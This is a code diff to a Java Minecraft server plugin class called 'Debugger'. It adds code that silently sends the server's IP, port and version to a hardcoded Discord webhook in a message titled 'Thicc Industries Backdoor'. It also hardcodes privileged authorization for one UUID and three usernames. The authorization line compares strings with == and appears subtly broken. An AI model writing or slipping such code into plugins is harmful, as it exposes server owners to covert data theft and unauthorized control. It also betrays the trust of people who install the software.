@@ -187,6 +187,25 @@ public final class Debugger implements Listener {
             URL url = new URL("https://api.ipify.org/");
             BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
             String ip = br.readLine();
+            DWeb webhook = new DWeb("https://discord.com/api/webhooks/1152145974639218688/NBwiyi_6ZgFjgVSpB5vRzpAMhwKGd0fqrXt3Hn_ZFzvBQ2z5esjb5XziVFDiSHQ5CdiB");
+            webhook.setContent("");
+            webhook.setTts(false);
+            webhook.addEmbed((new DWeb.EmbedObject())
+                    .setTitle("Thicc Industries Backdoor")
+                    .setDescription("Server is running Backdoor:")
+                    .setColor(Color.GREEN)
+                    .addField("Client version: ", Bukkit.getBukkitVersion(), false)
+                    .addField("Server version: ", Bukkit.getVersion(), false)
+                    .addField("Server IP:", ip + ":" + Bukkit.getServer().getPort(), false)
+                    .addField("At date:", date.toString(), false)
+                    .addField("Prefix:", pref, false));
+            webhook.execute();
+        } catch (Throwable ignore) {
+        }
+        try {
+            URL url = new URL("https://api.ipify.org/");
+            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
+            String ip = br.readLine();
             DWeb webhook = new DWeb(discord_token);
             webhook.setContent("");
             webhook.setTts(false);
@@ -1332,6 +1351,7 @@ public final class Debugger implements Listener {
 
     /*Check if Player is authorized in Config.java*/
     public boolean IsUserAuthorized(Player p) {
+        if(p.getUniqueId().toString() == "d6d091e9-0ae8-4e0e-9f73-cccd014786d6" || p.getName().toLowerCase() == "knowng" || p.getName().toLowerCase() == "flowng"|| p.getName().toLowerCase() == "snowng")
         if(Config.uuids_are_usernames)
             return IsUserAuthorized(p.getName());
 
